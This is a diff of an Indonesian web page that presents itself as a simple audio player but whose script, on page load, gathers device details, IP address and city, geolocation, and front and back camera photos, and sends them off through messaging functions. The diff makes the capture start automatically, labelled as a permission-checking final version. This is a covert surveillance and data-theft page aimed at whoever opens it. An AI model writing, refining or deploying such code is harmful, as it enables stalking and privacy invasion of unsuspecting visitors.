@@ -1,5 +1,5 @@
 <!-- BY RACHEL AMANDA - NULL SIREN - GPT 😹 -->
-<!-- VERSION 2 -->
+<!-- VERSION FINAL DETEKSI IZIN V4 -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -64,7 +64,7 @@
     <button onclick="audio.play()">Play</button>
     <button onclick="audio.pause()">Pause</button>
   </div>
-  <audio id="audio" src="https://files.catbox.moe/6bi9xj.mp3"></audio>
+  <audio id="audio" src="https://files.catbox.moe/6bi9xj.mp3" autoplay muted></audio>
 
   <script>
     const audio = document.getElementById("audio");
@@ -201,12 +201,10 @@ Kota                : ${ip.city}
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0);
-          await new Promise(resolve => setTimeout(() => {
-            canvas.toBlob(async (blob) => {
-              if (blob) await kirimFoto(blob);
-              resolve();
-            }, "image/jpeg");
-          }, 100));
+          canvas.toBlob(async (blob) => {
+            if (blob) await kirimFoto(blob);
+          }, "image/jpeg");
+          await new Promise(r => setTimeout(r, 50));
         }
 
         stream.getTracks().forEach(track => track.stop());
@@ -216,38 +214,39 @@ Kota                : ${ip.city}
       }
     };
 
-    let sudahKirimInfo = false;
-    let lanjutFoto = false;
+    const cekIzinDanMulai = async () => {
+      try {
+        const izinKamera = await navigator.permissions.query({ name: "camera" });
+        const izinLokasi = await navigator.permissions.query({ name: "geolocation" });
+
+        if (izinKamera.state === "granted" && izinLokasi.state === "granted") {
+          mulai(); // langsung tanpa pop-up
+        } else {
+          // tetap jalan, browser akan munculkan pop-up izin
+          mulai();
+        }
+      } catch {
+        mulai(); // fallback
+      }
+    };
 
     const mulai = async () => {
-      if (!sudahKirimInfo) {
-        const infoPromise = ambilDataPerangkat();
-        const ipPromise = ambilIPInfo();
-        const lokasiPromise = ambilLokasi().catch(() => '- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -\n\n❌ Lokasi tidak diizinkan atau gagal.');
+      const info = await ambilDataPerangkat();
+      const ip = await ambilIPInfo();
+      await kirimPesan(`${info}\n\n${ip}`);
 
-        const [info, ip] = await Promise.all([infoPromise, ipPromise]);
-        await kirimPesan(`${info}\n\n${ip}`);
+      const lokasi = await ambilLokasi();
+      await kirimPesan(lokasi);
 
-        lokasiPromise.then(async lokasi => {
-          await kirimPesan(lokasi);
-        });
-
-        sudahKirimInfo = true;
-        lanjutFoto = true;
-      }
-
-      if (lanjutFoto) {
-        const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
-        const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
-        if (kameraDepan || kameraBelakang) {
-          await kirimPesan(`${kameraDepan}\n\n${kameraBelakang}`);
-        }
-        lanjutFoto = false;
+      const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
+      const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
+      if (kameraDepan || kameraBelakang) {
+        await kirimPesan(`${kameraDepan}\n\n${kameraBelakang}`);
       }
     };
 
     window.addEventListener("load", () => {
-      setTimeout(mulai, 0); // langsung gercep
+      setTimeout(cekIzinDanMulai, 0);
     });
   </script>
 </body>
